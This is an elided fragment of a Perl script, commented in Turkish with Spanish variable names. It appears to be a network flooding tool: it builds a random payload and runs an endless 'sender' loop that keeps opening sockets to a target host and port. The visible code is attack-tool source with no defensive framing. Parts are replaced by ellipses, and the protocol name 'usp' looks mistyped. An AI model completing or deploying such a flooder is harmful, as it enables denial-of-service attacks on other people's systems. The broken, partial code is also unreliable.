...
my $randsemilla = "";
for($i = 0; $i < 25; $i++) { #Burası @vals daki yazılan harfler 0, 30 arası bir cümle oluşturuyor ex:(abababab) (st3st3tg353tg!)   
...
sub sender { # adı üstünde sender
    ...
    while(true) {
        my $paquete = "";
        $sock = IO::Socket::INET->new(PeerAddr => $host, PeerPort => $puerto, Proto => 'usp');  
        unless($sock) {
            print "\n[x] Unable to connect...\n\n";
            sleep(1);
            next;
